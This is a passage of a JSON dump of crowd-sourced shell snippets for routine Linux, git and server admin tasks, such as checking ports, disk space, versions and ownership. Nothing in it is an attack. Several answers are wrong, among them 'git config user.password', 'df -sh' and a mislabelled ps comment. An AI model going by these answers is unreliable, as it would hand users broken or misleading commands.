https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n",
    "reg_date": "2021-10-11T22:02:17.000Z"
  },
  {
    "id": 819,
    "keyword": null,
    "link": null,
    "title": " change message commit git",
    "description": "git commit --amend -m \"New commit message\"\ngit commit --amend -m \"New commit message.\"\ngit commit --amend --no-edit\ngit commit --amend // press enter, editor would open\n",
    "reg_date": "2021-10-11T22:02:17.000Z"
  },
  {
    "id": 820,
    "keyword": null,
    "link": null,
    "title": " change old commit message in git",
    "description": "git commit --amend -m \"New commit message\"\ngit commit --amend -m \"New commit message\" #This changes the message of the most recent commit.  git rebase -i <commit hash you want to change> #This allows you to make changes to commits starting from the HEAD of the #branch tree to the specified commit. #1.This open your default editor with a list of commits and actions for each.  #By default, the action is `pick`.  #2. For any commit you wish to change the message, change `pick` to `reword`.  #Don't change the commit message. #3. Save and close the editor. #4. For each commit that is set to `reword`, the editor will reopen for change #to be made. After each change save and close the editor and wait for the next. #4. Once you're done editing all the commit messages, you'll return to the  #command prompt, and have a new tree with the updated messages.   #Other actions that can be applied are: #`p` or `pick` &ndash; to keep the commit as is #`r` or `reword` &ndash; to keep the commit's content but alter the commit message #`e`or `edit` &ndash; to keep the commit's content but stop before committing #so that you can: #   - add new content or files #   - remove content or files #   - alter the content that was going to be committed # `s` or `squash` &ndash; to combine this commit's changes into the previous commit #(the commit above it in the list) #`f` or `fixup` &ndash; to combine this commit's change into the previous one but  #drop the commit message #`x` or `exec` &ndash; to run a shell command #`d` or `drop` &ndash; to delete the commit\ngit commit --amend -m \"New message\"\ngit commit --amend git push --force-with-lease <repository> <branch>\nStep1: git rebase -i HEAD~n to do interactive rebase for the last n commits affected. (i.e. if you want to change a commit message 3 commits back, do git rebase -i HEAD~3)  git will pop up an editor to handle those commits, notice this command:  #  r, reword = use commit, but edit the commit message that is exactly we need!  Step2: Change pick to r for those commits that you want to update the message. Don't bother changing the commit message here, it will be ignored. You'll do that on the next step. Save and close the editor.  Note that if you edit your rebase 'plan' yet it doesn't begin the process of letting you rename the files, run:  git rebase --continue If you want to change the text editor used for the interactive session Step3: Git will pop up another editor for every revision you put r before. Update the commit msg as you like, then save and close the editor.  Step4: After all commits msgs are updated. you might want to do git push -f to update the remote.\n",
    "reg_date": "2021-10-11T22:02:17.000Z"
  },
  {
    "id": 821,
    "keyword": null,
    "link": null,
    "title": " change owner directory linux",
    "description": "sudo chown -R username:group directory \nsudo chown -R $USER ~/.blabla\nsudo chown -R $USER ~/.blabla \n",
    "reg_date": "2021-10-11T22:02:17.000Z"
  },
  {
    "id": 822,
    "keyword": null,
    "link": null,
    "title": " change ownership of a directory in ubuntu",
    "description": "sudo chown -R $USER ~/.blabla\nsudo chown -R $USER ~/.blabla \n",
    "reg_date": "2021-10-11T22:02:18.000Z"
  },
  {
    "id": 823,
    "keyword": null,
    "link": null,
    "title": " change password linux",
    "description": "passwd userNameHere\nsudo passwd userlogin\npasswd $user\n# just type: passwd # it'll ask for the current passowrd and x2 times for the new one\n#if you dont't have your root password => then don't use sudo command  # passwd <username> Current password: New password: Retype new password: passwd: password updated successfully\n#To change password in linux #Log in to the user and Type the following command. passwd\n",
    "reg_date": "2021-10-11T22:02:18.000Z"
  },
  {
    "id": 824,
    "keyword": null,
    "link": null,
    "title": " change permissions pem",
    "description": "chmod 400 key.pem\n",
    "reg_date": "2021-10-11T22:02:18.000Z"
  },
  {
    "id": 825,
    "keyword": null,
    "link": null,
    "title": " change process name pm2",
    "description": "pm2 restart id --name newName\n",
    "reg_date": "2021-10-11T22:02:18.000Z"
  },
  {
    "id": 826,
    "keyword": null,
    "link": null,
    "title": " change pycharm git global author",
    "description": "$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n",
    "reg_date": "2021-10-11T22:02:19.000Z"
  },
  {
    "id": 827,
    "keyword": null,
    "link": null,
    "title": " change remote repository git",
    "description": "git remote set-url origin new.git.url/here\n# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git\n",
    "reg_date": "2021-10-11T22:02:20.000Z"
  },
  {
    "id": 828,
    "keyword": null,
    "link": null,
    "title": " change remote url git",
    "description": "git remote set-url origin new.git.url/here\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\n$ git remote -v > origin  https://github.com/USERNAME/REPOSITORY.git (fetch) > origin  https://github.com/USERNAME/REPOSITORY.git (push)  Change your remote\\'s URL from HTTPS to SSH with the git remote set-url command. $ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git  Verify that the remote URL has changed. $ git remote -v # Verify new remote URL > origin  git@github.com:USERNAME/REPOSITORY.git (fetch) > origin  git@github.com:USERNAME/REPOSITORY.git (push)\n$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\n",
    "reg_date": "2021-10-11T22:02:20.000Z"
  },
  {
    "id": 829,
    "keyword": null,
    "link": null,
    "title": " change shell kali linux",
    "description": "$ chsh #press enter and then insert the full path to your new shell \n",
    "reg_date": "2021-10-11T22:02:20.000Z"
  },
  {
    "id": 830,
    "keyword": null,
    "link": null,
    "title": " change ubuntu ip address command line",
    "description": "#/etc/netplan/99_config.yaml network:   version: 2   renderer: networkd   ethernets:     eth0:       addresses: [10.10.10.2/24]       gateway4: 10.10.10.1       nameservers:           search: [mydomain, otherdomain]           addresses: [9.9.9.9, 1.1.1.1] \n sudo ip link set dev eth0 up sudo dhclient -v eth0\n",
    "reg_date": "2021-10-11T22:02:21.000Z"
  },
  {
    "id": 831,
    "keyword": null,
    "link": null,
    "title": " change user in git repository",
    "description": "git config user.email \"you@example.com\" git config user.name \"Your Name\" git config user.password \"your password\" \ngit config --global user.email \"you@example.com\" git config --global user.name \"Your Name\" git config --global user.password \"your password\" \n",
    "reg_date": "2021-10-11T22:02:21.000Z"
  },
  {
    "id": 832,
    "keyword": null,
    "link": null,
    "title": " change user to sudo kali",
    "description": "usermod -a -G sudo <username>\n",
    "reg_date": "2021-10-11T22:02:22.000Z"
  },
  {
    "id": 833,
    "keyword": null,
    "link": null,
    "title": " change wp permission ubuntu",
    "description": "chmod 775 /var/www/wordpress\n",
    "reg_date": "2021-10-11T22:02:22.000Z"
  },
  {
    "id": 834,
    "keyword": null,
    "link": null,
    "title": " change wsl to version 1",
    "description": "wsl --set-version Ubuntu-18.04 1  // Run the above command from windows powershell  // This assumes you are running Ubuntu 18.04\n",
    "reg_date": "2021-10-11T22:02:22.000Z"
  },
  {
    "id": 835,
    "keyword": null,
    "link": null,
    "title": " change zsh to bash",
    "description": "chsh -s $(which zsh)\nchsh -s /bin/bash\nchsh -s /bin/bash exec bash --login  \nexec bash\n",
    "reg_date": "2021-10-11T22:02:23.000Z"
  },
  {
    "id": 836,
    "keyword": null,
    "link": null,
    "title": " chcek number of cpus available on linux machine",
    "description": "lscpu | egrep 'CPU\\(s\\)'\n",
    "reg_date": "2021-10-11T22:02:23.000Z"
  },
  {
    "id": 837,
    "keyword": null,
    "link": null,
    "title": " check active cron jobs linux",
    "description": "systemctl status cron ----------OR--------------- crontab -l\n",
    "reg_date": "2021-10-11T22:02:23.000Z"
  },
  {
    "id": 838,
    "keyword": null,
    "link": null,
    "title": " check all the ports in use mac",
    "description": "sudo lsof -PiTCP -sTCP:LISTEN  COMMAND     PID      USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME GitHub      850 grgarside   6u   IPv4 0x23c345381d089301      0t0  TCP localhost:25035 (LISTEN)\n$ npx kill-port 3000 8080 8081  Process on port 3000 killed Process on port 8080 killed Process on port 8081 killed \n",
    "reg_date": "2021-10-11T22:02:23.000Z"
  },
  {
    "id": 839,
    "keyword": null,
    "link": null,
    "title": " check apache version ubuntu",
    "description": "apache2 -v\napache2 -v    \n",
    "reg_date": "2021-10-11T22:02:23.000Z"
  },
  {
    "id": 840,
    "keyword": null,
    "link": null,
    "title": " check bash version",
    "description": "bash --version\n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 841,
    "keyword": null,
    "link": null,
    "title": " check busy ports linux",
    "description": "netstat -tulpn | grep LISTEN\n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 842,
    "keyword": null,
    "link": null,
    "title": " check centos version",
    "description": "$ cat /etc/redhat-release  output : CentOS Linux release 7.4.1708 (Core)\n<p>On the GUI (Gnome) upper right corner click on settings and then on details </p>  By command line   cat /etc/centos-release  This command works also changing the word centos by os (os-release)\n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 843,
    "keyword": null,
    "link": null,
    "title": " check changes after git pull",
    "description": "The very first line in the output of a pull looks like this:  $ git pull Updating 37b431a..b2615b4  So to get the diff between before and after pull request, use -->  $ git diff 37b431a..b2615b4 \n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 844,
    "keyword": null,
    "link": null,
    "title": " check chrome version ubuntu via terminal",
    "description": "google-chrome --version\n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 845,
    "keyword": null,
    "link": null,
    "title": " check compatible ubuntu nvidia driver 18.04",
    "description": "sudo ubuntu-drivers devices\n",
    "reg_date": "2021-10-11T22:02:24.000Z"
  },
  {
    "id": 846,
    "keyword": null,
    "link": null,
    "title": " check computers connected to network ubuntu",
    "description": "I always use nmap. To scan for all devices in your network, use:  nmap -sP 192.168.0.1/24  More here: https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/  It is a great tool to know about. You may want to install nmap using:  sudo apt-get install nmap if you are using Debian or  sudo pacman -S nmap if you are using Arch. \n",
    "reg_date": "2021-10-11T22:02:25.000Z"
  },
  {
    "id": 847,
    "keyword": null,
    "link": null,
    "title": " check connectivity if access other  ip address  centos 7",
    "description": "#1- telnet $ sudo telnet IP Port  Trying 11.111.111.11... Connected to 11.111.111.11. Escape character is '^]'.  #2- nmap $ sudo nmap -p Port IP  Starting Nmap 7.01 ( https://nmap.org ) at 2021-02-06 08:34 EET Nmap scan report for 11.111.111.11 Host is up (0.0020s latency). PORT     STATE SERVICE  Nmap done: 1 IP address (1 host up) scanned in 1.3 seconds \n",
    "reg_date": "2021-10-11T22:02:25.000Z"
  },
  {
    "id": 848,
    "keyword": null,
    "link": null,
    "title": " check cpu temp linux",
    "description": "watch -n 2 sensors\n",
    "reg_date": "2021-10-11T22:02:25.000Z"
  },
  {
    "id": 849,
    "keyword": null,
    "link": null,
    "title": " check cuda nn version",
    "description": "cat /usr/local/cuda/include/cudnn.h | grep CUDNN_MAJOR -A 2orcat /usr/include/cudnn.h | grep CUDNN_MAJOR -A 2\n",
    "reg_date": "2021-10-11T22:02:25.000Z"
  },
  {
    "id": 850,
    "keyword": null,
    "link": null,
    "title": " check debian version",
    "description": "lsb_release -a  #this shows all info about your distro.\n$ lsb_release -a\nLSB_OS_RELEASE=\"\" lsb_release -a\n",
    "reg_date": "2021-10-11T22:02:25.000Z"
  },
  {
    "id": 851,
    "keyword": null,
    "link": null,
    "title": " check details of installed memory in ubuntu",
    "description": "sudo lshw -short -C memory\n",
    "reg_date": "2021-10-11T22:02:26.000Z"
  },
  {
    "id": 852,
    "keyword": null,
    "link": null,
    "title": " check disk space ubuntu from terminal",
    "description": "# shows total, available, and used. df / -h\n#report file system disk space usage df -h or sudo du -sh ./* or du -h -s * #check space with  path df / -h or  df -h /  #check space with  type df -Th\ndf -t ext4\n",
    "reg_date": "2021-10-11T22:02:26.000Z"
  },
  {
    "id": 853,
    "keyword": null,
    "link": null,
    "title": " check disk usage linux Code Example",
    "description": "du -h --max-depth=1\n",
    "reg_date": "2021-10-11T22:02:26.000Z"
  },
  {
    "id": 854,
    "keyword": null,
    "link": null,
    "title": " check folder size in linux terminal",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -sh /home/user/\ndf -sh .\ndu -s /home/george  \ndu -sh /home/george\n",
    "reg_date": "2021-10-11T22:02:26.000Z"
  },
  {
    "id": 855,
    "keyword": null,
    "link": null,
    "title": " check folder sizes linux",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -h --max-depth=1\ndu -sh /home/user/\ndu -sh /var\ndf -sh .\ndu -lh --max-depth=1 --block-size=M | sort -nr\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 856,
    "keyword": null,
    "link": null,
    "title": " check git url",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\n# Check existing git url: git remote -v\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \nwithout network git config --get remote.origin.url  with network (detailed) git remote show origin\n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 857,
    "keyword": null,
    "link": null,
    "title": " check gnome version ubuntu terminal",
    "description": "gnome-shell --version\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 858,
    "keyword": null,
    "link": null,
    "title": " check gpu free memory linux",
    "description": "nvidia-smi \n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 859,
    "keyword": null,
    "link": null,
    "title": " check how much memory linux",
    "description": "free -m\nfor more information search this webside -- https://www.howtogeek.com/659529/how-to-check-memory-usage-from-the-linux-terminal/\ntop - 15:20:30 up  6:57,  5 users,  load average: 0.64, 0.44, 0.33 Tasks: 265 total,   1 running, 263 sleeping,   0 stopped,   1 zombie %Cpu(s):  7.8 us,  2.4 sy,  0.0 ni, 88.9 id,  0.9 wa,  0.0 hi,  0.0 si,  0.0 st KiB Mem:   8167848 total,  6642360 used,  1525488 free,  1026876 buffers KiB Swap:  1998844 total,        0 used,  1998844 free,  2138148 cached    PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND                                                                                   2986 enlighte  20   0  584m  42m  26m S  14.3  0.5   0:44.27 yakuake                                                                                   1305 root      20   0  448m  68m  39m S   5.0  0.9   3:33.98 Xorg                                                                                      7701 enlighte  20   0  424m  17m  10m S   4.0  0.2   0:00.12 kio_thumbnail\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 860,
    "keyword": null,
    "link": null,
    "title": " check if django is installed",
    "description": "$ django-admin.py version\n#Make sure you are in your applications venv i.e (source \"application\"_env/bin/activate) # Then run the below command  python -m django --version \nimport django django.VERSION\n>>> import django >>> django.VERSION (2, 0, 0, 'final', 0)\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 861,
    "keyword": null,
    "link": null,
    "title": " check if docker is running",
    "description": "sudo systemctl status docker #(OR) systemctl status docker.service # To check the status of Docker whether running or not.\nsystemctl status docker\n$ docker -v Docker version 1.7.0, build 0baf609 $ echo $? 0 \n#to check if docker is installed run $ docker --version #to check if docker is running run command $ systemctl status docker\ndockerd\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 862,
    "keyword": null,
    "link": null,
    "title": " check if heroku cli is logged in",
    "description": "heroku whoami\n",
    "reg_date": "2021-10-11T22:02:27.000Z"
  },
  {
    "id": 863,
    "keyword": null,
    "link": null,
    "title": " check if jquery is installed",
    "description": "$(document).ready(function(){   if (jQuery) {       // jQuery is loaded       alert(\"Yeah!\");   } else {     // jQuery is not loaded     alert(\"Doesn't Work\");   } });\nif (typeof jQuery == \"undefined\") {   alert(\"JQuery is not installed\"); } else {   alert(\"JQuery is installed correctly!\"); }\n/* Answer to: \"test if jquery works\" */  window.onload = function() {     if (window.jQuery) {           // jQuery is loaded           console.log(\"jQuery has loaded!\");     } else {         // jQuery is not loaded         console.log(\"jQuery has not loaded!\");     } }\nwindow.onload = function() {     if (window.jQuery) {           // jQuery is loaded           alert(\"Yeah!\");     } else {         // jQuery is not loaded         alert(\"Doesn't Work\");     } }\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 864,
    "keyword": null,
    "link": null,
    "title": " check if kubernetes is running",
    "description": "kubectl cluster-info\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 865,
    "keyword": null,
    "link": null,
    "title": " check if mongodb is installed",
    "description": "mongod --version\nOpen the command prompt and type \"cd c:\\program files\\mongodb\\server\\your version\\bin\". After you enter the bin folder type \"mongo start\". If you get either a successful connection or failed one it means it's installed at least.\nmongo --version\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 866,
    "keyword": null,
    "link": null,
    "title": " check if mongodb is running mac",
    "description": "ps -ef | grep mongod | grep -v grep | wc -l | tr -d ' '\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 867,
    "keyword": null,
    "link": null,
    "title": " check if nginx is running",
    "description": "service nginx status\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 868,
    "keyword": null,
    "link": null,
    "title": " check if port is running in ubuntu",
    "description": "sudo lsof -i:22\nnetstat -tulpn\n# Any of the following sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # Port sudo nmap -sTU -O IP-address-Here\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 869,
    "keyword": null,
    "link": null,
    "title": " check if service in running to a port in linux",
    "description": "one of those: sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo ss -tulpn | grep LISTEN sudo lsof -i:22 ## see a specific port such as 22 ## sudo nmap -sTU -O IP-address-Here\nsudo lsof -i -P -n | grep LISTEN\n",
    "reg_date": "2021-10-11T22:02:28.000Z"
  },
  {
    "id": 870,
    "keyword": null,
    "link": null,
    "title": " check if wayland or xorg",
    "description": "echo $XDG_SESSION_TYPE\n$ echo $XDG_SESSION_TYPE x11 \n",
    "reg_date": "2021-10-11T22:02:29.000Z"
  },
  {
    "id": 871,
    "keyword": null,
    "link": null,
    "title": " check installed packages apt-get",
    "description": "apt list --installed\n",
    "reg_date": "2021-10-11T22:02:29.000Z"
  },
  {
    "id": 872,
    "keyword": null,
    "link": null,
    "title": " check jdk version",
    "description": "java -version  #for jre version javac -version  # for java compiler version  \njava -version\n",
    "reg_date": "2021-10-11T22:02:29.000Z"
  },
  {
    "id": 873,
    "keyword": null,
    "link": null,
    "title": " check laptop mac address",
    "description": "type on command -> ipconfig/all\n",
    "reg_date": "2021-10-11T22:02:29.000Z"
  },
  {
    "id": 874,
    "keyword": null,
    "link": null,
    "title": " check length of string shell script",
    "description": "${#string}\n",
    "reg_date": "2021-10-11T22:02:29.000Z"
  },
  {
    "id": 875,
    "keyword": null,
    "link": null,
    "title": " check lines of code added removed by a specific user",
    "description": "# its grossly long. but run this on linux in the root of your project :D git log --shortstat --pretty=\"%cE\" | sed 's/\\(.*\\)@.*/\\1/' | grep -v \"^$\" | awk 'BEGIN { line=\"\"; } !/^ / { if (line==\"\" || !match(line, $0)) {line = $0 \",\" line }} /^ / { print line \" # \" $0; line=\"\"}' | sort | sed -E 's/# //;s/ files? changed,//;s/([0-9]+) ([0-9]+ deletion)/\\1 0 insertions\\(+\\), \\2/;s/\\(\\+\\)$/\\(\\+\\), 0 deletions\\(-\\)/;s/insertions?\\(\\+\\), //;s/ deletions?\\(-\\)//' | awk 'BEGIN {name=\"\"; files=0; insertions=0; deletions=0;} {if ($1 != name && name != \"\") { print name \": \" files \" files changed, \" insertions \" insertions(+), \" deletions \" deletions(-), \" insertions-deletions \" net\"; files=0; insertions=0; deletions=0; name=$1; } name=$1; files+=$2; insertions+=$3; deletions+=$4} END {print name \": \" files \" files changed, \" insertions \" insertions(+), \" deletions \" deletions(-), \" insertions-deletions \" net\";}' \n",
    "reg_date": "2021-10-11T22:02:30.000Z"
  },
  {
    "id": 876,
    "keyword": null,
    "link": null,
    "title": " check lines of code in a folder",
    "description": "find . -name '*.[FileExtention]' | xargs wc -l \n",
    "reg_date": "2021-10-11T22:02:30.000Z"
  },
  {
    "id": 877,
    "keyword": null,
    "link": null,
    "title": " check logged in user git shell",
    "description": "git config -l git config user.name git config user.email\n",
    "reg_date": "2021-10-11T22:02:30.000Z"
  },
  {
    "id": 878,
    "keyword": null,
    "link": null,
    "title": " check nvidia driver version linux",
    "description": "nvidia-smi\n",
    "reg_date": "2021-10-11T22:02:31.000Z"
  },
  {
    "id": 879,
    "keyword": null,
    "link": null,
    "title": " check octet permission ubuntu",
    "description": "stat -c \"%a %n\" * \n",
    "reg_date": "2021-10-11T22:02:31.000Z"
  },
  {
    "id": 880,
    "keyword": null,
    "link": null,
    "title": " check os type linux",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:02:31.000Z"
  },
  {
    "id": 881,
    "keyword": null,
    "link": null,
    "title": " check pod verion",
    "description": "pod --version\n",
    "reg_date": "2021-10-11T22:02:31.000Z"
  },
  {
    "id": 882,
    "keyword": null,
    "link": null,
    "title": " check ports linux 3",
    "description": "lsof -i -P -n\n",
    "reg_date": "2021-10-11T22:02:32.000Z"
  },
  {
    "id": 883,
    "keyword": null,
    "link": null,
    "title": " check postgres version in ubuntu",
    "description": "psql --version\n$ locate bin/postgres /usr/lib/postgresql/9.3/bin/postgres \nSELECT version();\n",
    "reg_date": "2021-10-11T22:02:33.000Z"
  },
  {
    "id": 884,
    "keyword": null,
    "link": null,
    "title": " check powershell version",
    "description": "PS C:\\> $PSVersionTable.PSVersion\n",
    "reg_date": "2021-10-11T22:02:33.000Z"
  },
  {
    "id": 885,
    "keyword": null,
    "link": null,
    "title": " check ram memory usage linux",
    "description": "free -m\ntop - 15:20:30 up  6:57,  5 users,  load average: 0.64, 0.44, 0.33 Tasks: 265 total,   1 running, 263 sleeping,   0 stopped,   1 zombie %Cpu(s):  7.8 us,  2.4 sy,  0.0 ni, 88.9 id,  0.9 wa,  0.0 hi,  0.0 si,  0.0 st KiB Mem:   8167848 total,  6642360 used,  1525488 free,  1026876 buffers KiB Swap:  1998844 total,        0 used,  1998844 free,  2138148 cached    PID USER      PR  NI  VIRT  RES  SHR S  %CPU %MEM    TIME+  COMMAND                                                                                   2986 enlighte  20   0  584m  42m  26m S  14.3  0.5   0:44.27 yakuake                                                                                   1305 root      20   0  448m  68m  39m S   5.0  0.9   3:33.98 Xorg                                                                                      7701 enlighte  20   0  424m  17m  10m S   4.0  0.2   0:00.12 kio_thumbnail\n",
    "reg_date": "2021-10-11T22:02:33.000Z"
  },
  {
    "id": 886,
    "keyword": null,
    "link": null,
    "title": " check ram on linux",
    "description": "$ cat /proc/meminfo\nsudo dmidecode --type 17\nfree -m\n$ free -t | awk 'NR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}' or $ free -t | awk 'FNR == 2 {printf(\"Current Memory Utilization is : %.2f%\"), $3/$2*100}'  Current Memory Utilization is : 20.42% \nfor more information search this webside -- https://www.howtogeek.com/659529/how-to-check-memory-usage-from-the-linux-terminal/\n",
    "reg_date": "2021-10-11T22:02:33.000Z"
  },
  {
    "id": 887,
    "keyword": null,
    "link": null,
    "title": " check react version",
    "description": "npm view react version npm view react-script version \n// To view which version of React is/was used for a particular app, type in the below in commandline/terminal. npm view react version npm view react-native version\nnpm list react\nconst REACT_VERSION = React.version;  ReactDOM.render(   <div>React version: {REACT_VERSION}</div>,   document.getElementById('root') ); <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.1.0/react.min.js\"></script> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react/15.1.0/react-dom.min.js\"></script>  <div id=\"root\"></div>\n",
    "reg_date": "2021-10-11T22:02:33.000Z"
  },
  {
    "id": 888,
    "keyword": null,
    "link": null,
    "title": " check redis server status",
    "description": "redis-cli ping\n$ redis-cli ping PONG \n",
    "reg_date": "2021-10-11T22:02:34.000Z"
  },
  {
    "id": 889,
    "keyword": null,
    "link": null,
    "title": " check redis version",
    "description": "redis-server --version\n",
    "reg_date": "2021-10-11T22:02:34.000Z"
  },
  {
    "id": 890,
    "keyword": null,
    "link": null,
    "title": " check remote link git",
    "description": "git config --get remote.origin.url\n",
    "reg_date": "2021-10-11T22:02:34.000Z"
  },
  {
    "id": 891,
    "keyword": null,
    "link": null,
    "title": " check running process in linux",
    "description": "ps -aux  # (print all processes owned by a user named \"x\")\nhtop\n",
    "reg_date": "2021-10-11T22:02:34.000Z"
  },
  {
    "id": 892,
    "keyword": null,
    "link": null,
    "title": " check service logs linux",
    "description": "journalctl -u service-name.service\n",
    "reg_date": "2021-10-11T22:02:34.000Z"
  },
  {
    "id": 893,
    "keyword": null,
    "link": null,
    "title": " check services running on port linux",
    "description": "one of those: sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo ss -tulpn | grep LISTEN sudo lsof -i:22 ## see a specific port such as 22 ## sudo nmap -sTU -O IP-address-Here\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 894,
    "keyword": null,
    "link": null,
    "title": " check size of folder linux",
    "description": "# show all folder size in the current directory du -h --max-depth=1\ndu -h --max-depth=1\ndu -sh /home/user/\ndu -sh /var\ndf -sh .\n#using -h displays the size of a folder in kb,mb and gb for better understanding #and human readable ll -h\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 895,
    "keyword": null,
    "link": null,
    "title": " check snap version",
    "description": "snap version\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 896,
    "keyword": null,
    "link": null,
    "title": " check ssd or hdd linux",
    "description": "$ cat /sys/block/sda/queue/rotational  #If the output is 1, the disk is HDD. #If the output is 0 (zero), the disk is SDD. #Because, SSDs won't rotate. So the output should be zero # if you have SSD in your system.\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 897,
    "keyword": null,
    "link": null,
    "title": " check start date of process id linux",
    "description": "ls -ltrh /proc | grep username\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 898,
    "keyword": null,
    "link": null,
    "title": " check status smb linux",
    "description": "sudo systemctl status smbd\n",
    "reg_date": "2021-10-11T22:02:35.000Z"
  },
  {
    "id": 899,
    "keyword": null,
    "link": null,
    "title": " check storage space of server human readable",
    "description": "#check storage of server df -h ### Human format   #using -h displays the size of a folder in kb,mb and gb for better understanding #and human readable ll -h\n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 900,
    "keyword": null,
    "link": null,
    "title": " check supervisord status",
    "description": "sudo supervisorctl status \n$ ps aux | grep supervisor root      1751  0.0  2.4  53668 12364 ?        Ss   01:41   0:00 /usr/bin/python /usr/bin/supervisord -c /etc/supervisor/supervisord.conf \n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 901,
    "keyword": null,
    "link": null,
    "title": " check th binggest file in linux",
    "description": "Just Enter this cmd on cli :::Note here /var is directory path ,you can change as per your requirnment  sudo du -a /var | sort -n -r | head -n 10  1008372 /var 313236  /var/www 253964  /var/log 192544  /var/lib 152628  /var/spool 152508  /var/spool/squid 136524  /var/spool/squid/00 95736   /var/log/mrtg.log 74688   /var/log/squid 62544   /var/cache\n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 902,
    "keyword": null,
    "link": null,
    "title": " check that redis is running",
    "description": "$ redis-cli ping PONG \n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 903,
    "keyword": null,
    "link": null,
    "title": " check the linux distribution",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 904,
    "keyword": null,
    "link": null,
    "title": " check ubuntu disk space",
    "description": "# shows total, available, and used. df / -h\n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 905,
    "keyword": null,
    "link": null,
    "title": " check ubuntu version",
    "description": "cat /etc/os-release\nlsb_release -a cat /etc/os-release lsb_release -a \n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 906,
    "keyword": null,
    "link": null,
    "title": " check upstream",
    "description": "git remote show origin\n",
    "reg_date": "2021-10-11T22:02:36.000Z"
  },
  {
    "id": 907,
    "keyword": null,
    "link": null,
    "title": " check used disk space in linux",
    "description": "du -h\n",
    "reg_date": "2021-10-11T22:02:37.000Z"
  },
  {
    "id": 908,
    "keyword": null,
    "link": null,
    "title": " check version gpu",
    "description": "nvidia-smi\n",
    "reg_date": "2021-10-11T22:02:37.000Z"
  },
  {
    "id": 909,
    "keyword": null,
    "link": null,
    "title": " check what ports are open linux",
    "description": "# Any of the following sudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\nsudo lsof -i:22\nsudo lsof -i -P -n | grep LISTEN sudo netstat -tulpn | grep LISTEN sudo lsof -i:22 # see a specific port such as 22 sudo nmap -sTU -O IP-address-Here\n## if you use linux sudo ss -tulw \n",
    "reg_date": "2021-10-11T22:02:37.000Z"
  },
  {
    "id": 910,
    "keyword": null,
    "link": null,
    "title": " checking for existing ssh keys",
    "description": "$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n",
    "reg_date": "2021-10-11T22:02:37.000Z"
  },
  {
    "id": 911,
    "keyword": null,
    "link": null,
    "title": " checking if a substring exists in a string bash",
    "description": "string='Haystack';  if [[ $string =~ \"Needle\" ]] then    echo \"It's there!\" fi\n",
